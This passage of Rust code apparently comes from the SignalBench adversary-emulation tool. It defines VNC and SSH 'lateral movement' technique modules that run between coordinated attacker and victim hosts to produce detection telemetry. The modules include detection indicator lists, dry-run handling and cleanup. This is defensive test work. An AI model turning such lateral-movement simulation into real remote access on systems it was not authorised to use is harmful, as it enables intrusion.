                    default: Some("/tmp/signalbench_vnc_proto.log".to_string()),
                },
            ],
            detection: "Monitor for: VNC connections on port 5900, RFB protocol handshake patterns (RFB 003.008 banner), VNC Authentication exchanges with DES-encrypted responses, FramebufferUpdate messages, sustained VNC traffic over 45+ seconds, PointerEvent and KeyEvent patterns, TightVNC file transfer messages (types 132/133), file upload requests with suspicious filenames (gocortex.sh, .bin extensions), large data transfers during VNC sessions, cleartext VNC protocol headers, file transfer within remote desktop sessions".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: true,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            if dry_run {
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would execute full RFB protocol handshake and 30-second VNC session".to_string(),
                    artifacts: vec![],
                    cleanup_required: false,
                });
            }

            let role = config.parameters.get("__voltron_role").map(|s| s.as_str()).unwrap_or("attacker");
            let password = config.parameters.get("vnc_password").cloned().unwrap_or_else(|| "signalbench".to_string());
            let log_file = config.parameters.get("log_file").cloned().unwrap_or_else(|| "/tmp/signalbench_vnc_proto.log".to_string());

            let result = if role.to_lowercase() == "victim" {
                rfb_victim_server(log_file.clone(), password).await
            } else {
                let target_ip = config.parameters.get("__voltron_target_ip")
                    .ok_or("Missing target IP")?
                    .clone();
                rfb_attacker_client(target_ip, log_file.clone(), password).await
            };

            match result {
                Ok(msg) => Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: msg,
                    artifacts: vec![log_file],
                    cleanup_required: true,
                }),
                Err(e) => Err(e),
            }
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if std::path::Path::new(artifact).exists() {
                    if let Err(e) = std::fs::remove_file(artifact) {
                        warn!("Failed to remove {artifact}: {e}");
                    } else {
                        info!("Removed {artifact}");
                    }
                }
            }
            Ok(())
        })
    }
}

pub struct SshProtoLateralMovement {}

#[async_trait]
impl AttackTechnique for SshProtoLateralMovement {
    fn info(&self) -> Technique {
        Technique {
            id: "T1021.004-PROTO".to_string(),
            name: "SSH Protocol Lateral Movement".to_string(),
            description: "Implements the SSH protocol per RFC 4253 to generate authentic SSH lateral movement telemetry. The victim runs an SSH server on port 2222 (avoiding conflict with system SSH on port 22), sending SSH-2.0 banner, handling version exchange, simulating key exchange (KEX) negotiation, and accepting authentication. The attacker connects as an SSH client, completes version exchange and KEX, authenticates, and simulates a 30-second active SSH session with channel requests and command execution. All traffic is cleartext SSH protocol (no encryption) for maximum visibility. Requires Voltron multi-host coordination.".to_string(),
            category: "Lateral Movement".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save SSH protocol log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_ssh_proto.log".to_string()),
                },
            ],
            detection: "Monitor for: SSH connections on port 2222, SSH-2.0 protocol banners, SSH version exchange patterns, KEX init packets, authentication requests, SSH channel open/data messages, sustained SSH traffic over 30+ seconds, cleartext SSH protocol headers, SignalBench SSH signatures in version strings, non-standard SSH ports (2222 vs typical 22)".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: true,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            if dry_run {
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would execute full SSH protocol handshake and 30-second session".to_string(),
                    artifacts: vec![],
                    cleanup_required: false,
                });
            }

            let role = config.parameters.get("__voltron_role").map(|s| s.as_str()).unwrap_or("attacker");
            let log_file = config.parameters.get("log_file").cloned().unwrap_or_else(|| "/tmp/signalbench_ssh_proto.log".to_string());

            let result = if role.to_lowercase() == "victim" {
                ssh_victim_server(log_file.clone()).await
            } else {
                let target_ip = config.parameters.get("__voltron_target_ip")
                    .ok_or("Missing target IP")?
                    .clone();
                ssh_attacker_client(target_ip, log_file.clone()).await
            };

            match result {
                Ok(msg) => Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: msg,
                    artifacts: vec![log_file],
                    cleanup_required: true,
                }),
                Err(e) => Err(e),
            }
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if std::path::Path::new(artifact).exists() {
                    if let Err(e) = std::fs::remove_file(artifact) {
                        warn!("Failed to remove {artifact}: {e}");
                    } else {
                        info!("Removed {artifact}");
                    }
                }
            }
            Ok(())
        })
    }
}
